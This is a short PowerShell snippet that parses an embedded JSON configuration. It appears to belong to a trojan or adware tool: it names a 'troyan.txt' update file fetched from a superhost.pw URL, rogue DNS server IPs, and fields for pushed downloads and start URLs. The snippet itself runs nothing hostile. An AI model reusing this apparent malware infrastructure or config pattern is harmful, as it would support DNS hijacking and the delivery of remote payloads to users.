$server = '{
    "UpdateFile":  "C:\\inetpub\\wwwroot\\ads\\d-data\\troyan.txt",
    "updateUrl":  "http://data-1.superhost.pw/d-data/troyan.txt",
    "primaryDns":  "109.248.201.226",
    "secondaryDns":  "109.248.201.224",
    "track":  false,
    "trackingUrl":  null,
    "autoStart":  false,
    "autoUpdate":  false,
    "domains":  [
                    "test1.com",
                    "test2.com",
                    "test3.com",
                    "test4.com",
                    "test5.com"
                ],
    "ipDomains":  {
                      "109.248.201.226":  "test1.com",
                      "109.248.201.224":  "test2.com",
                      "109.248.201.223":  "test3.com",
                      "109.248.201.222":  "test4.com",
                      "109.248.201.220":  "test5.com"
                  },
    "pushes":  [

               ],
    "startDownloads":  [

                       ],
    "startUrls":  [

                  ],
    "front":  [
                  "ActiveHours.png"
              ],
    "embeddings":  [

                   ],
    "isValid":  false
}' | ConvertFrom-Json
$xdata = @{
    'test1.com'=''
'test2.com'=''
'test3.com'=''
'test4.com'=''
'test5.com'=''
}
